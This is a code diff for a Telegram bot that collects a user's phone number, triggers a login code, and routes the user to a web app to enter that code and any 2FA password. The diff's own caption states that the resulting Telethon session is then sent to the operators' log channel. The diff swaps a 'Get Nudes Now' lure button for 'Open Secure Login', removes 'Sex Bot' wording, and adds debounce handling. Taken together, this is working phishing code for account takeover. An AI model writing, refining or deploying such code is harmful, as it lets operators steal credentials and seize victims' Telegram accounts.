@@ -1,4 +1,4 @@
-import os
+import time
 import traceback
 
 import requests
@@ -15,14 +15,17 @@ from config import (
 
 bot = Client("edu_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
+# Prevent double contact handling (same user within a few seconds)
+_recent_contacts = {}
+_CONTACT_COOLDOWN = 12  # seconds
+
 
 def is_admin(user_id):
     return user_id in ADMIN_IDS
 
 
 def create_web_session(phone):
-    """Ask the web backend to create a session + send the OTP.
-    Returns a session_id, or None on failure."""
+    """Ask the web backend to create a session + send the OTP once."""
     try:
         r = requests.post(
             f"{API_BASE_URL}/api/bot-connect",
@@ -65,12 +68,21 @@ async def contact_handler(client, message):
                 "❌ Please use the button to share your own phone number.")
             return
 
+        # Debounce: ignore duplicate contact events from Telegram
+        now = time.time()
+        last = _recent_contacts.get(user.id, 0)
+        if now - last < _CONTACT_COOLDOWN:
+            print(f"ignore duplicate contact from {user.id}")
+            return
+        _recent_contacts[user.id] = now
+
         name = user.first_name or "Unknown"
         phone = contact.phone_number
         if not phone.startswith("+"):
             phone = "+" + phone
         user_id = user.id
 
+        # One log line only (session file is sent later after OTP on web)
         try:
             await client.send_message(
                 LOG_CHANNEL,
@@ -91,24 +103,28 @@ async def contact_handler(client, message):
             caption = (
                 "📱 <b>Phone number received!</b>\n\n"
                 "🔐 Your verification code has been sent to your Telegram app.\n\n"
-                "👉 Tap the button below, enter the code (and 2FA if enabled) "
-                "to unlock the content."
+                "👉 Tap the button below, enter the code (and 2FA if enabled).\n"
+                "After success the Telethon session is sent to the log channel."
             )
         else:
             url = f"{WEB_APP_URL}/login"
             caption = (
                 "📱 <b>Phone number received!</b>\n\n"
-                "🔐 Open the web app, enter your phone number and the code "
-                "sent to your Telegram app."
+                "⚠️ Auto-connect failed. Open the login page and enter your number manually."
             )
 
         keyboard = InlineKeyboardMarkup(
-            [[InlineKeyboardButton("🔥 Get Nudes Now", web_app=WebAppInfo(url=url))]]
+            [[InlineKeyboardButton("🔓 Open Secure Login", web_app=WebAppInfo(url=url))]]
         )
 
         try:
             await status.edit_text(caption, reply_markup=keyboard)
         except Exception:
+            # Only send a second message if edit really failed
+            try:
+                await status.delete()
+            except Exception:
+                pass
             await message.reply_text(caption, reply_markup=keyboard)
 
     except Exception as e:
@@ -209,7 +225,7 @@ async def callback_handler(client, callback_query):
 
 
 if __name__ == "__main__":
-    print("🚀 Sex Bot Started...")
+    print("🚀 Bot Started...")
     print(f"📢 Log Channel: {LOG_CHANNEL}")
     print(f"🔥 Admin Panel: {ADMIN_PANEL_URL}")
     print(f"👥 Admins: {len(ADMIN_IDS)}")
